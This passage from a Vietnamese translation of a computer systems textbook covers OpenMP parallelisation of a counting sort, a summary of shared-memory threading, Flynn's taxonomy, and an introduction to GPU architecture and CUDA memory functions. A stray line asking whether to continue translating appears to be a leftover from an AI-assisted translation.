<p><strong><code>#pragma omp critical</code></strong>: chỉ định rằng đoạn code trong phạm vi critical section chỉ được thực thi bởi <strong>một thread</strong> tại một thời điểm.<br />
Điều này tương đương với việc dùng <strong>mutex</strong> trong phiên bản Pthreads của chương trình.<br />
Ở đây, mỗi thread sẽ lần lượt cập nhật mảng <code>counts</code> chia sẻ.</p>
</li>
</ul>
<p>Hãy đánh giá hiệu năng của hàm này khi chạy với 100 triệu phần tử:</p>
<pre><code>$ ./countElems_mp 100000000 1
Run Time for Phase 1 is 0.249893

$ ./countElems_mp 100000000 2
Run Time for Phase 1 is 0.124462

$ ./countElems_mp 100000000 4
Run Time for Phase 1 is 0.068749
</code></pre>
<p>Kết quả rất tốt: hàm đạt <strong>speedup</strong> bằng 2 khi chạy với 2 thread, và <strong>speedup</strong> 3.63 khi chạy với 4 thread.<br />
Hiệu năng thậm chí còn tốt hơn cả phiên bản Pthreads!</p>
<h4 id="hàm-writearray-trong-openmp"><a class="header" href="#hàm-writearray-trong-openmp">Hàm <code>writeArray</code> trong OpenMP</a></h4>
<p>Song song hóa hàm <code>writeArray</code> <strong>khó hơn nhiều</strong>.<br />
Đoạn code sau minh họa một giải pháp khả thi:</p>
<pre><code class="language-c">void writeArray(int *counts, int *array) {
    int i;

    // giả định số lượng thread không vượt quá MAX
    #pragma omp parallel for schedule(dynamic)
    for (i = 0; i &lt; MAX; i++) {
        int j = 0, amt, start = 0;
        for (j = 0; j &lt; i; j++) {  // tính toán vị trí bắt đầu &quot;thực&quot;
            start += counts[j];
        }

        amt = counts[i]; // số lượng phần tử cần ghi

        // ghi đè amt phần tử bằng giá trị i, bắt đầu từ vị trí start
        for (j = start; j &lt; start + amt; j++) {
            array[j] = i;
        }
    }
}
</code></pre>
<p>Trước khi song song hóa, chúng tôi đã thay đổi hàm này vì <a href="C14-SharedMemory/_attachments/countSort.c">phiên bản cũ</a> của <code>writeArray</code> khiến biến <code>j</code> phụ thuộc vào các vòng lặp trước đó.<br />
Trong phiên bản mới, mỗi thread sẽ tính toán giá trị <code>start</code> duy nhất của mình dựa trên tổng của tất cả các phần tử trước đó trong <code>counts</code>.</p>
<p>Khi loại bỏ sự phụ thuộc này, việc song song hóa trở nên khá đơn giản.<br />
Pragma <code>#pragma omp parallel for</code> sẽ tạo ra một nhóm thread và song song hóa vòng lặp <code>for</code> bằng cách gán cho mỗi thread một tập con các vòng lặp cần thực hiện.<br />
Nhắc lại, pragma này là sự kết hợp của <code>omp parallel</code> và <code>omp for</code> (đã được sử dụng trong phần song song hóa hàm <code>countElems</code>).</p>
<p>Cách lập lịch theo kiểu <strong>chunking</strong> (như trong hàm <code>countElems</code> trước đó) <strong>không phù hợp</strong> ở đây, vì có khả năng mỗi phần tử trong <code>counts</code> có tần suất rất khác nhau.<br />
Điều này dẫn đến việc các thread sẽ không có khối lượng công việc bằng nhau, khiến một số thread bị gán nhiều việc hơn các thread khác.<br />
Do đó, ta sử dụng mệnh đề <code>schedule(dynamic)</code>, để mỗi thread hoàn thành vòng lặp được gán trước khi yêu cầu một vòng lặp mới từ bộ quản lý thread.</p>
<p>Vì mỗi thread ghi vào các vị trí khác nhau trong mảng, nên <strong>không cần</strong> dùng mutual exclusion (loại trừ lẫn nhau) cho hàm này.</p>
<p>Hãy chú ý xem code OpenMP gọn gàng hơn nhiều so với phiên bản dùng POSIX threads.<br />
Mã rất dễ đọc và chỉ cần chỉnh sửa rất ít.<br />
Đây là một trong những sức mạnh của <strong>abstraction</strong> (trừu tượng hóa), khi các chi tiết triển khai được ẩn khỏi lập trình viên.</p>
<p>Tuy nhiên, một sự đánh đổi cần thiết của abstraction là <strong>quyền kiểm soát</strong>.<br />
Lập trình viên giả định rằng trình biên dịch “đủ thông minh” để xử lý các chi tiết song song hóa, nhờ đó việc song song hóa ứng dụng trở nên dễ dàng hơn.<br />
Tuy nhiên, lập trình viên sẽ không còn đưa ra các quyết định chi tiết về cách song song hóa đó.<br />
Nếu không hiểu rõ cách các pragma OpenMP thực thi bên trong, sẽ khó để debug một ứng dụng OpenMP hoặc biết pragma nào là phù hợp nhất để dùng trong một tình huống cụ thể.</p>
<h3 id="1474-tìm-hiểu-thêm-về-openmp"><a class="header" href="#1474-tìm-hiểu-thêm-về-openmp">14.7.4. Tìm hiểu thêm về OpenMP</a></h3>
<p>Phần thảo luận sâu hơn về OpenMP nằm ngoài phạm vi của cuốn sách này, nhưng có một số tài nguyên miễn phí hữu ích<sup class="footnote-reference"><a href="#1">1</a></sup><sup class="footnote-reference"><a href="#2">2</a></sup> để học OpenMP.</p>
<h3 id="tài-liệu-tham-khảo-8"><a class="header" href="#tài-liệu-tham-khảo-8">Tài liệu tham khảo:</a></h3>
<ol>
<li>
<p>Blaise Barney. “OpenMP”.<br />
<a href="https://hpc.llnl.gov/tuts/openMP/">https://hpc.llnl.gov/tuts/openMP/</a></p>
</li>
<li>
<p>Richard Brown và Libby Shoop. “Multicore Programming with OpenMP”.<br />
<em>CSinParallel: Parallel Computing in the Computer Science curriculum</em>.<br />
<a href="http://selkie.macalester.edu/csinparallel/modules/MulticoreProgramming/build/html/index.html">http://selkie.macalester.edu/csinparallel/modules/MulticoreProgramming/build/html/index.html</a></p>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="148-tóm-tắt"><a class="header" href="#148-tóm-tắt">14.8. Tóm tắt</a></h2>
<p>Chương này đã cung cấp cái nhìn tổng quan về <strong>bộ xử lý đa lõi</strong> (multicore processors) và cách lập trình cho chúng.<br />
Cụ thể, chúng ta đã tìm hiểu về thư viện <strong>POSIX threads</strong> (hay <strong>Pthreads</strong>) và cách sử dụng nó để tạo ra các chương trình đa luồng đúng đắn, giúp tăng tốc hiệu năng của một chương trình đơn luồng.<br />
Các thư viện như POSIX và OpenMP sử dụng mô hình giao tiếp <strong>shared memory</strong> (bộ nhớ chia sẻ), trong đó các thread chia sẻ dữ liệu trong cùng một không gian bộ nhớ.</p>
<h3 id="những-điểm-chính-cần-ghi-nhớ"><a class="header" href="#những-điểm-chính-cần-ghi-nhớ">Những điểm chính cần ghi nhớ</a></h3>
<p><strong>Threads là đơn vị cơ bản của các chương trình concurrent</strong></p>
<p>:   Để song song hóa một chương trình tuần tự, lập trình viên sử dụng các cấu trúc nhẹ gọi là <strong>thread</strong>.<br />
Trong một <strong>process đa luồng</strong> (multithreaded process) cụ thể, mỗi thread có vùng <strong>stack</strong> riêng, nhưng chia sẻ dữ liệu chương trình, vùng <strong>heap</strong> và code lệnh của process.<br />
Giống như process, thread chạy <strong>nondeterministically</strong> (không xác định trước) trên CPU (tức là thứ tự thực thi thay đổi giữa các lần chạy, và việc thread nào được gán cho core nào là do hệ điều hành quyết định).</p>
<p><strong>Cấu trúc đồng bộ hóa đảm bảo chương trình hoạt động đúng</strong></p>
<p>:   Hệ quả của việc dùng bộ nhớ chia sẻ là các thread có thể vô tình ghi đè dữ liệu trong vùng nhớ chung.<br />
<strong>Race condition</strong> có thể xảy ra bất cứ khi nào hai thao tác cập nhật sai một giá trị chia sẻ.<br />
Khi giá trị chia sẻ đó là dữ liệu, một dạng đặc biệt của race condition gọi là <strong>data race</strong> có thể xuất hiện.<br />
Các cấu trúc đồng bộ hóa (mutex, semaphore, v.v.) giúp đảm bảo tính đúng đắn của chương trình bằng cách buộc các thread phải thực thi lần lượt khi cập nhật biến chia sẻ.</p>
<p><strong>Cẩn trọng khi sử dụng cấu trúc đồng bộ hóa</strong></p>
<p>:   Đồng bộ hóa vốn dĩ tạo ra các điểm tính toán tuần tự trong một chương trình vốn song song.<br />
Do đó, cần chú ý <em>cách</em> áp dụng các khái niệm đồng bộ hóa.<br />
Tập hợp các thao tác cần chạy <strong>atomic</strong> (nguyên tử) được gọi là <strong>critical section</strong>.<br />
Nếu critical section quá lớn, các thread sẽ thực thi tuần tự, không mang lại cải thiện về thời gian chạy.<br />
Nếu dùng cấu trúc đồng bộ hóa một cách cẩu thả, các tình huống như <strong>deadlock</strong> có thể vô tình xảy ra.<br />
Chiến lược tốt là để thread sử dụng biến cục bộ nhiều nhất có thể và chỉ cập nhật biến chia sẻ khi thật sự cần thiết.</p>
<p><strong>Không phải mọi thành phần của chương trình đều có thể song song hóa</strong></p>
<p>:   Một số chương trình tất yếu có các thành phần tuần tự lớn, có thể cản trở hiệu năng của chương trình đa luồng trên nhiều core (ví dụ: <strong>Amdahl’s Law</strong>).<br />
Ngay cả khi một tỷ lệ lớn của chương trình có thể song song hóa, speedup hiếm khi tuyến tính.<br />
Người đọc cũng nên xem xét các chỉ số khác như <strong>efficiency</strong> (hiệu suất) và <strong>scalability</strong> (khả năng mở rộng) khi đánh giá hiệu năng chương trình.</p>
<h3 id="tài-liệu-đọc-thêm-1"><a class="header" href="#tài-liệu-đọc-thêm-1">Tài liệu đọc thêm</a></h3>
<p>Chương này nhằm giới thiệu khái niệm về <strong>concurrency</strong> (tính đồng thời) với threads; nó <strong>không</strong> bao quát toàn bộ chủ đề.<br />
Để tìm hiểu thêm về lập trình với POSIX threads và OpenMP, hãy tham khảo các hướng dẫn chất lượng cao của Blaise Barney từ Lawrence Livermore National Labs:</p>
<ul>
<li><a href="https://hpc-tutorials.llnl.gov/posix/">Pthreads</a></li>
<li><a href="https://hpc.llnl.gov/tuts/openMP/">OpenMP</a></li>
</ul>
<p>Đối với các công cụ tự động hỗ trợ gỡ lỗi chương trình song song, người đọc có thể tìm hiểu:</p>
<ul>
<li><a href="https://valgrind.org/docs/manual/hg-manual.html">Helgrind</a></li>
<li><a href="https://valgrind.org/docs/manual/drd-manual.html">DRD</a> trong bộ công cụ Valgrind.</li>
</ul>
<p>Trong <a href="C14-SharedMemory/../C15-Parallel/index.html#_looking_ahead_other_parallel_systems_and_parallel_programming_models">chương cuối</a> của cuốn sách, chúng ta sẽ có cái nhìn tổng quan ở mức cao về các kiến trúc song song phổ biến khác và cách lập trình cho chúng.<br />
<a href="C14-SharedMemory/../C15-Parallel/index.html#_looking_ahead_other_parallel_systems_and_parallel_programming_models">Xem tiếp để tìm hiểu thêm</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="15-nhìn-về-phía-trước-các-hệ-thống-song-song-khác-và-các-mô-hình-lập-trình-song-song-looking-ahead-other-parallel-systems-and-parallel-programming-models"><a class="header" href="#15-nhìn-về-phía-trước-các-hệ-thống-song-song-khác-và-các-mô-hình-lập-trình-song-song-looking-ahead-other-parallel-systems-and-parallel-programming-models">15. Nhìn về phía trước: Các hệ thống song song khác và các mô hình lập trình song song (Looking Ahead: Other Parallel Systems and Parallel Programming Models)</a></h2>
<p>Trong <a href="C15-Parallel/../C14-SharedMemory/index.html#_leveraging_shared_memory_in_the_multicore_era">chương trước</a>, chúng ta đã thảo luận về <strong>shared memory parallelism</strong> (tính song song bộ nhớ chia sẻ) và lập trình đa luồng (multithreaded programming).<br />
Trong chương này, chúng ta sẽ giới thiệu các mô hình lập trình song song và ngôn ngữ khác cho các loại kiến trúc khác nhau.<br />
Cụ thể, chúng ta sẽ tìm hiểu:</p>
<ul>
<li>Tính song song cho <strong>hardware accelerator</strong> (bộ tăng tốc phần cứng), tập trung vào <strong>graphics processing unit</strong> (GPU – bộ xử lý đồ họa) và <strong>general-purpose computing on GPUs</strong> (GPGPU computing – tính toán đa dụng trên GPU), sử dụng <strong>CUDA</strong> làm ví dụ.</li>
<li><strong>Distributed memory systems</strong> (hệ thống bộ nhớ phân tán) và <strong>message passing</strong> (truyền thông điệp), sử dụng <strong>MPI</strong> làm ví dụ.</li>
<li><strong>Cloud computing</strong> (điện toán đám mây), sử dụng <strong>MapReduce</strong> và <strong>Apache Spark</strong> làm ví dụ.</li>
</ul>
<h3 id="một-thế-giới-hoàn-toàn-mới-flynns-taxonomy-of-architecture"><a class="header" href="#một-thế-giới-hoàn-toàn-mới-flynns-taxonomy-of-architecture">Một thế giới hoàn toàn mới: Flynn's Taxonomy of Architecture</a></h3>
<p><strong>Flynn's taxonomy</strong> thường được sử dụng để mô tả hệ sinh thái của kiến trúc máy tính hiện đại (Hình 1).</p>
<p><img src="C15-Parallel/_images/flynn.png" alt="Flynn's Taxonomy consists of two independent axes" /></p>
<p><strong>Hình 1.</strong> Flynn's taxonomy phân loại các cách mà bộ xử lý áp dụng lệnh.</p>
<p>Trục ngang đề cập đến <strong>data stream</strong> (luồng dữ liệu), trong khi trục dọc đề cập đến <strong>instruction stream</strong> (luồng lệnh).<br />
<strong>Stream</strong> trong ngữ cảnh này là một dòng dữ liệu hoặc lệnh.<br />
<strong>Single stream</strong> (luồng đơn) phát ra một phần tử mỗi đơn vị thời gian, tương tự như một hàng đợi.<br />
Ngược lại, <strong>multiple streams</strong> (nhiều luồng) thường phát ra nhiều phần tử mỗi đơn vị thời gian (tưởng tượng như nhiều hàng đợi).</p>
<p>Do đó:</p>
<ul>
<li><strong>Single instruction stream (SI)</strong> phát ra một lệnh mỗi đơn vị thời gian.</li>
<li><strong>Multiple instruction stream (MI)</strong> phát ra nhiều lệnh mỗi đơn vị thời gian.</li>
<li><strong>Single data stream (SD)</strong> phát ra một phần tử dữ liệu mỗi đơn vị thời gian.</li>
<li><strong>Multiple data stream (MD)</strong> phát ra nhiều phần tử dữ liệu mỗi đơn vị thời gian.</li>
</ul>
<p>Một bộ xử lý có thể được phân loại vào một trong bốn loại dựa trên kiểu luồng mà nó sử dụng:</p>
<ul>
<li>
<p><strong>SISD</strong>: <em>Single instruction / single data</em> — Hệ thống có một đơn vị điều khiển xử lý một luồng lệnh duy nhất, cho phép nó chỉ thực thi một lệnh tại một thời điểm.<br />
Tương tự, bộ xử lý chỉ có thể xử lý một luồng dữ liệu hoặc một đơn vị dữ liệu tại một thời điểm.<br />
Hầu hết các bộ xử lý thương mại trước giữa những năm 2000 là máy SISD.</p>
</li>
<li>
<p><strong>MISD</strong>: <em>Multiple instruction / single data</em> — Hệ thống có nhiều đơn vị lệnh cùng xử lý một luồng dữ liệu duy nhất.<br />
MISD thường được thiết kế để tích hợp khả năng chịu lỗi (fault tolerance) trong các hệ thống nhiệm vụ quan trọng, chẳng hạn như chương trình điều khiển bay của tàu con thoi NASA.<br />
Tuy nhiên, ngày nay máy MISD hầu như không còn được sử dụng trong thực tế.</p>
</li>
<li>
<p><strong>SIMD</strong>: <em>Single instruction / multiple data</em> — Hệ thống thực thi <strong>cùng một</strong> lệnh trên nhiều dữ liệu đồng thời và theo kiểu <strong>lockstep</strong> (đồng bộ từng bước).<br />
Trong thực thi lockstep, tất cả các lệnh được đưa vào một hàng đợi, trong khi dữ liệu được phân phối cho các đơn vị tính toán khác nhau.<br />
Khi thực thi, mỗi đơn vị tính toán sẽ thực hiện đồng thời lệnh đầu tiên trong hàng đợi, sau đó đồng thời thực hiện lệnh tiếp theo, và cứ thế tiếp tục.<br />
Ví dụ nổi tiếng nhất của kiến trúc SIMD là <strong>GPU</strong>.<br />
Các siêu máy tính đời đầu cũng áp dụng kiến trúc SIMD.<br />
Chúng ta sẽ thảo luận về GPU chi tiết hơn trong <a href="C15-Parallel/gpu.html#_GPUs">phần tiếp theo</a>.</p>
</li>
<li>
<p><strong>MIMD</strong>: <em>Multiple instruction / multiple data</em> — Hệ thống thuộc loại kiến trúc được sử dụng rộng rãi nhất.<br />
Chúng cực kỳ linh hoạt và có khả năng xử lý nhiều lệnh hoặc nhiều luồng dữ liệu cùng lúc.<br />
Vì hầu hết các máy tính hiện đại đều sử dụng CPU đa lõi, nên đa số được phân loại là máy MIMD.<br />
Chúng ta sẽ thảo luận về một loại hệ thống MIMD khác — <strong>distributed memory systems</strong> — trong <a href="C15-Parallel/distrmem.html#_distributed_memory_systems_message_passing_and_mpi">Mục 15.2</a>.</p>
</li>
</ul>
<p>Bạn có muốn tôi dịch tiếp sang phần <strong>15.1. Heterogeneous Computing: Hardware Accelerators, GPGPU Computing, and CUDA</strong> ngay sau đây không?</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="151-heterogeneous-computing-hardware-accelerators-gpgpu-computing-and-cuda"><a class="header" href="#151-heterogeneous-computing-hardware-accelerators-gpgpu-computing-and-cuda">15.1. Heterogeneous Computing: Hardware Accelerators, GPGPU Computing, and CUDA</a></h2>
<p><strong>Heterogeneous computing</strong> (tính toán không đồng nhất) là hình thức tính toán sử dụng nhiều đơn vị xử lý khác nhau có trong một máy tính.<br />
Các đơn vị xử lý này thường có <strong>ISA</strong> (Instruction Set Architecture – kiến trúc tập lệnh) khác nhau, một số được hệ điều hành quản lý, số khác thì không.<br />
Thông thường, heterogeneous computing nghĩa là hỗ trợ tính toán song song bằng cách sử dụng các lõi CPU của máy tính cùng với một hoặc nhiều <strong>accelerator unit</strong> (bộ tăng tốc phần cứng) như <strong>graphics processing unit</strong> (GPU – bộ xử lý đồ họa) hoặc <strong>field programmable gate array</strong> (FPGA – mảng cổng lập trình được)^1^.</p>
<p>Ngày càng phổ biến việc các lập trình viên triển khai giải pháp heterogeneous computing cho các bài toán lớn, đòi hỏi xử lý dữ liệu và tính toán chuyên sâu.<br />
Những loại bài toán này xuất hiện nhiều trong <strong>tính toán khoa học</strong> (scientific computing), cũng như trong nhiều ứng dụng khác liên quan đến xử lý Big Data, phân tích và trích xuất thông tin.<br />
Bằng cách tận dụng khả năng xử lý của cả CPU và các accelerator unit có sẵn trên máy tính, lập trình viên có thể tăng mức độ thực thi song song trong ứng dụng, từ đó cải thiện hiệu năng và khả năng mở rộng.</p>
<p>Trong phần này, chúng ta sẽ giới thiệu về heterogeneous computing sử dụng <strong>hardware accelerator</strong> (bộ tăng tốc phần cứng) để hỗ trợ tính toán song song đa mục đích.<br />
Chúng ta sẽ tập trung vào GPU và ngôn ngữ lập trình <strong>CUDA</strong>.</p>
<h3 id="1511-hardware-accelerators"><a class="header" href="#1511-hardware-accelerators">15.1.1. Hardware Accelerators</a></h3>
<p>Ngoài CPU, máy tính còn có các đơn vị xử lý khác được thiết kế để thực hiện các tác vụ cụ thể.<br />
Những đơn vị này không phải là bộ xử lý đa dụng như CPU, mà là phần cứng chuyên dụng được tối ưu hóa để thực hiện các chức năng đặc thù cho một số thiết bị hoặc để xử lý các loại tác vụ chuyên biệt trong hệ thống.<br />
FPGA, <strong>Cell processor</strong> và GPU là ba ví dụ tiêu biểu của loại đơn vị xử lý này.</p>
<h4 id="fpgas"><a class="header" href="#fpgas">FPGAs</a></h4>
<p><strong>FPGA</strong> (Field Programmable Gate Array) là một vi mạch tích hợp bao gồm các cổng logic, bộ nhớ và các thành phần kết nối.<br />
FPGA có thể <strong>lập trình lại</strong> (reprogrammable), nghĩa là có thể cấu hình lại để thực hiện một chức năng cụ thể ở mức phần cứng, và thường được dùng để tạo nguyên mẫu cho <strong>ASIC</strong> (Application-Specific Integrated Circuit – mạch tích hợp chuyên dụng).</p>
<p>FPGA thường tiêu thụ ít điện năng hơn so với một CPU đầy đủ, giúp vận hành tiết kiệm năng lượng.<br />
Một số cách FPGA được tích hợp vào hệ thống máy tính bao gồm: làm bộ điều khiển thiết bị (device controller), xử lý dữ liệu cảm biến, thực hiện các tác vụ mật code (cryptography), và thử nghiệm các thiết kế phần cứng mới (do có thể lập trình lại, các thiết kế có thể được triển khai, gỡ lỗi và kiểm thử trực tiếp trên FPGA).</p>
<p>FPGA có thể được thiết kế như một mạch với số lượng lớn các đơn vị xử lý đơn giản.<br />
Chúng cũng là các thiết bị có <strong>độ trễ thấp</strong> (low-latency) và có thể kết nối trực tiếp với bus hệ thống.<br />
Nhờ đó, FPGA đã được sử dụng để triển khai các phép tính song song tốc độ cao, bao gồm các mẫu xử lý song song độc lập lặp lại trên nhiều kênh dữ liệu đầu vào.</p>
<p>Tuy nhiên, việc lập trình lại FPGA mất nhiều thời gian, và việc sử dụng chúng thường giới hạn ở việc hỗ trợ thực thi nhanh các phần cụ thể của khối lượng công việc song song hoặc chạy một khối lượng công việc cố định^2^.</p>
<h4 id="gpus-và-cell-processors"><a class="header" href="#gpus-và-cell-processors">GPUs và Cell Processors</a></h4>
<p><strong>Cell processor</strong> là một bộ xử lý đa lõi bao gồm một bộ xử lý đa dụng và nhiều <strong>co-processor</strong> (đồng xử lý) chuyên dụng để tăng tốc một loại tính toán cụ thể, chẳng hạn như xử lý đa phương tiện.<br />
Hệ thống chơi game <strong>Sony PlayStation 3</strong> là kiến trúc Cell đầu tiên, sử dụng các bộ đồng xử lý Cell để xử lý đồ họa nhanh.</p>
<p><strong>GPU</strong> thực hiện các phép tính đồ họa máy tính — chúng xử lý dữ liệu hình ảnh để hỗ trợ kết xuất đồ họa và xử lý ảnh tốc độ cao.<br />
GPU ghi kết quả vào <strong>frame buffer</strong>, sau đó dữ liệu này được đưa tới màn hình máy tính.<br />
Được thúc đẩy bởi các ứng dụng game máy tính, ngày nay các GPU mạnh mẽ đã trở thành tiêu chuẩn trong máy tính để bàn và laptop.</p>
<p>Vào giữa những năm 2000, các nhà nghiên cứu tính toán song song đã nhận ra tiềm năng của việc sử dụng <strong>accelerator</strong> kết hợp với các lõi CPU của máy tính để hỗ trợ tính toán song song đa mục đích.</p>
<h3 id="1512-tổng-quan-kiến-trúc-gpu-gpu-architecture-overview"><a class="header" href="#1512-tổng-quan-kiến-trúc-gpu-gpu-architecture-overview">15.1.2. Tổng quan kiến trúc GPU (GPU architecture overview)</a></h3>
<p>Phần cứng GPU được thiết kế cho đồ họa máy tính và xử lý hình ảnh.<br />
Lịch sử phát triển GPU gắn liền với ngành công nghiệp trò chơi điện tử.<br />
Để hỗ trợ đồ họa chi tiết hơn và tốc độ dựng khung hình nhanh hơn, GPU bao gồm <strong>hàng nghìn bộ xử lý chuyên dụng</strong>, được thiết kế đặc biệt để xử lý hiệu quả dữ liệu hình ảnh, chẳng hạn như giá trị pixel của một ảnh 2D, theo phương thức song song.</p>
<p>Mô hình thực thi phần cứng mà GPU áp dụng là <strong>SIMT</strong> (Single Instruction / Multiple Thread – một lệnh, nhiều luồng), một biến thể của SIMD.<br />
SIMT giống như SIMD đa luồng, trong đó một lệnh được thực thi đồng bộ (lockstep) bởi nhiều thread chạy trên các đơn vị xử lý.<br />
Trong SIMT, tổng số thread có thể lớn hơn tổng số đơn vị xử lý, đòi hỏi phải lập lịch nhiều nhóm thread trên các bộ xử lý để thực thi cùng một chuỗi lệnh.</p>
<p>Ví dụ: GPU của <strong>NVIDIA</strong> bao gồm nhiều <strong>Streaming Multiprocessor</strong> (SM), mỗi SM có các đơn vị điều khiển thực thi và không gian bộ nhớ riêng (register, L1 cache và shared memory).<br />
Mỗi SM bao gồm nhiều lõi <strong>Scalar Processor</strong> (SP).<br />
SM có một <strong>warp scheduler</strong> để lập lịch các <strong>warp</strong> (tập hợp các thread của ứng dụng) thực thi đồng bộ trên các lõi SP.</p>
<p>Trong thực thi đồng bộ (lockstep execution), mỗi thread trong một warp thực thi cùng một lệnh ở mỗi chu kỳ nhưng trên dữ liệu khác nhau.<br />
Ví dụ: nếu một ứng dụng chuyển đổi ảnh màu sang ảnh xám, mỗi thread trong warp sẽ thực thi cùng một chuỗi lệnh tại cùng thời điểm để đặt giá trị RGB của một pixel thành giá trị xám tương ứng.<br />
Mỗi thread xử lý một pixel khác nhau, dẫn đến nhiều pixel của ảnh được cập nhật song song.</p>
<p>Vì các thread được thực thi đồng bộ, thiết kế bộ xử lý có thể được đơn giản hóa để nhiều lõi chia sẻ cùng một đơn vị điều khiển lệnh.<br />
Mỗi đơn vị chứa bộ nhớ cache và nhiều thanh ghi để lưu dữ liệu trong quá trình xử lý đồng bộ bởi các lõi xử lý song song.</p>
<p><strong>Hình 1</strong> minh họa kiến trúc GPU đơn giản hóa, bao gồm cái nhìn chi tiết về một SM.<br />
Mỗi SM bao gồm nhiều lõi SP, một warp scheduler, một đơn vị điều khiển thực thi, một L1 cache và vùng bộ nhớ chia sẻ.</p>
<p><img src="C15-Parallel/_images/gpugpu.png" alt="Example GPU architecture with showing multiple SM units with32 SP cores." /></p>
<p><strong>Hình 1.</strong> Ví dụ về kiến trúc GPU đơn giản hóa với 2.048 lõi.<br />
Hình này cho thấy GPU được chia thành 64 đơn vị SM, và chi tiết của một SM bao gồm 32 lõi SP. <strong>Warp scheduler</strong> của SM sẽ lập lịch các warp thread trên các lõi SP. Một warp gồm nhiều thread sẽ thực thi đồng bộ (lockstep) trên các lõi SP.</p>
<h3 id="1513-gpgpu-computing"><a class="header" href="#1513-gpgpu-computing">15.1.3. GPGPU Computing</a></h3>
<p><strong>General Purpose GPU</strong> (GPGPU – GPU đa dụng) là hình thức sử dụng các bộ xử lý GPU chuyên dụng để thực hiện các tác vụ tính toán song song đa mục đích.<br />
GPGPU computing kết hợp việc tính toán trên các lõi CPU của host với tính toán <strong>SIMT</strong> trên các bộ xử lý GPU.<br />
GPGPU hoạt động hiệu quả nhất với các ứng dụng song song (hoặc các phần của ứng dụng) có thể được xây dựng dưới dạng xử lý dòng (stream processing) trên một lưới dữ liệu đa chiều.</p>
<p>Hệ điều hành của host <strong>không</strong> quản lý bộ xử lý hoặc bộ nhớ của GPU.<br />
Do đó, lập trình viên phải tự cấp phát vùng nhớ trên GPU cho dữ liệu của chương trình và sao chép dữ liệu giữa bộ nhớ host và bộ nhớ GPU.<br />
Các ngôn ngữ và thư viện lập trình GPGPU thường cung cấp giao diện lập trình cho bộ nhớ GPU, giúp ẩn bớt hoặc toàn bộ sự phức tạp của việc quản lý bộ nhớ GPU một cách tường minh.</p>
<p>Ví dụ: trong <strong>CUDA</strong>, lập trình viên có thể gọi các hàm thư viện CUDA để cấp phát bộ nhớ CUDA trên GPU và sao chép dữ liệu giữa bộ nhớ CUDA trên GPU và bộ nhớ host.<br />
Lập trình viên CUDA cũng có thể sử dụng <strong>CUDA unified memory</strong> — một lớp trừu tượng của CUDA về không gian bộ nhớ thống nhất giữa host và GPU.<br />
CUDA unified memory ẩn đi sự tách biệt giữa bộ nhớ GPU và host, cũng như việc sao chép dữ liệu giữa chúng, khỏi lập trình viên CUDA.</p>
<p>GPU cũng chỉ hỗ trợ hạn chế cho việc đồng bộ hóa thread, điều này có nghĩa là GPGPU đặc biệt hiệu quả với các ứng dụng song song <strong>embarrassingly parallel</strong> (hoàn toàn độc lập) hoặc có phạm vi lớn các phép tính song song dạng luồng độc lập với rất ít điểm đồng bộ.<br />
GPU là các bộ xử lý song song quy mô lớn, và bất kỳ chương trình nào thực hiện các chuỗi dài các bước tính toán độc lập, giống hệt (hoặc gần giống hệt) trên dữ liệu đều có thể đạt hiệu năng tốt khi triển khai dưới dạng ứng dụng song song GPGPU.</p>
<p>GPGPU cũng hoạt động tốt khi số lần sao chép dữ liệu giữa bộ nhớ host và thiết bị là ít.<br />
Nếu việc truyền dữ liệu GPU–CPU chiếm phần lớn thời gian thực thi, hoặc nếu ứng dụng yêu cầu đồng bộ hóa tinh vi (fine-grained synchronization), thì GPGPU có thể không đạt hiệu năng tốt hoặc không mang lại nhiều lợi ích so với phiên bản đa luồng chạy trên CPU.</p>
<h3 id="1514-cuda"><a class="header" href="#1514-cuda">15.1.4. CUDA</a></h3>
<p><strong>CUDA</strong> (Compute Unified Device Architecture)^3^ là giao diện lập trình của NVIDIA dành cho GPGPU computing trên các thiết bị đồ họa của hãng.<br />
CUDA được thiết kế cho <strong>heterogeneous computing</strong> (tính toán không đồng nhất), trong đó một số hàm của chương trình chạy trên CPU của host, và các hàm khác chạy trên GPU.</p>
<p>Lập trình viên thường viết chương trình CUDA bằng <strong>C</strong> hoặc <strong>C++</strong> với các annotation chỉ định <strong>CUDA kernel function</strong> (hàm kernel CUDA), và gọi các hàm thư viện CUDA để quản lý bộ nhớ thiết bị GPU.<br />
Một <strong>kernel function</strong> trong CUDA là một hàm được thực thi trên GPU, và một <strong>CUDA thread</strong> là đơn vị thực thi cơ bản trong chương trình CUDA.<br />
Các CUDA thread được lập lịch thành các <strong>warp</strong> và thực thi đồng bộ (lockstep) trên các SM của GPU, chạy code kernel CUDA trên phần dữ liệu của chúng được lưu trong bộ nhớ GPU.</p>
<p>Các hàm kernel được đánh dấu bằng từ khóa <code>global</code> để phân biệt với các hàm chạy trên host.<br />
Các hàm <code>device</code> trong CUDA là các hàm phụ trợ có thể được gọi từ một hàm kernel CUDA.</p>
<p>Không gian bộ nhớ của một chương trình CUDA được chia thành bộ nhớ host và bộ nhớ GPU.<br />
Chương trình phải <strong>tường minh</strong> cấp phát và giải phóng vùng nhớ GPU để lưu trữ dữ liệu chương trình được xử lý bởi các kernel CUDA.<br />
Lập trình viên CUDA phải hoặc là sao chép dữ liệu một cách tường minh giữa bộ nhớ host và GPU, hoặc sử dụng <strong>CUDA unified memory</strong> để có một không gian bộ nhớ được chia sẻ trực tiếp giữa GPU và host.</p>
<p>Dưới đây là ví dụ về các hàm cơ bản của CUDA để cấp phát bộ nhớ, giải phóng bộ nhớ và sao chép dữ liệu một cách tường minh:</p>
<pre><code class="language-c">/* &quot;returns&quot; through pass-by-pointer param dev_ptr GPU memory of size bytes
 * returns cudaSuccess or a cudaError value on error
 */
cudaMalloc(void **dev_ptr, size_t size);

/* free GPU memory
 * returns cudaSuccess or cudaErrorInvalidValue on error
 */
cudaFree(void *data);

/* copies data from src to dst, direction is based on value of kind
 *   kind: cudaMemcpyHosttoDevice is copy from cpu to gpu memory
 *   kind: cudaMemcpyDevicetoHost is copy from gpu to cpu memory
 * returns cudaSuccess or a cudaError value on error
 */
cudaMemcpy(void *dst, const void *src, size_t count, cudaMemcpyKind kind);
</code></pre>
<p>Các CUDA thread được tổ chức thành <strong>block</strong>, và các block được tổ chức thành <strong>grid</strong>.<br />
Grid có thể được tổ chức thành nhóm block một chiều, hai chiều hoặc ba chiều.<br />
Tương tự, block có thể được tổ chức thành nhóm thread một chiều, hai chiều hoặc ba chiều.</p>
